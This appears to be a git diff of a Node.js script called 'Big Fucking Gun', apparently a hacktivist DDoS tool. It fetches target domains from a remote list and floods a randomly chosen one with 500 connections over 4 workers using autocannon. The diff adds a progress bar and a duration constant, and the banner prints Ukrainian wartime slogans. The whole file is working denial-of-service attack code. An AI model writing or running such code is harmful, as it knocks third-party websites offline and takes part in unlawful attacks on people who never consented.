@@ -1,7 +1,9 @@
 const fetch = require("node-fetch");
 const autocannon = require("autocannon");
+const ProgressBar = require('progress');
 
 const TARGETS_URL = "https://bfg-targets.vercel.app/";
+const ATTACK_DURATION = 30 // s
 
 const attack = async () => {
   console.log("\n\nFetching target...");
@@ -9,14 +11,18 @@ const attack = async () => {
   const targets = await fetch(TARGETS_URL).then((r) => r.json());
   const url = targets[Math.floor(Math.random() * targets.length)].domain;
 
-  console.log(`Target ${url}, starting attack...`);
+  console.log(`Attacking ${url}...`)
+  const bar = new ProgressBar(`[:bar]`, { total: ATTACK_DURATION });
+  const timer = setInterval(() => bar.tick(), 1000)
 
   const result = await autocannon({
     url,
     workers: 4,
     connections: 500,
-    duration: 30, // s
+    duration: ATTACK_DURATION,
   });
+
+  clearInterval(timer);
 
   console.log(`Requests: ${result.requests.sent}`);
   console.log("Response codes:");
@@ -40,7 +46,7 @@ const start = async () => {
   start();
 };
 
-console.log("Big Fucked Gun, version 0.0.3-beta\n");
+console.log("Big Fucking Gun, version 0.0.3-beta\n");
 console.log("================================");
 console.log("Слава Україні!\nГероям Слава!\nСлава Нації!\nСмерть ворогам!");
 console.log("================================");
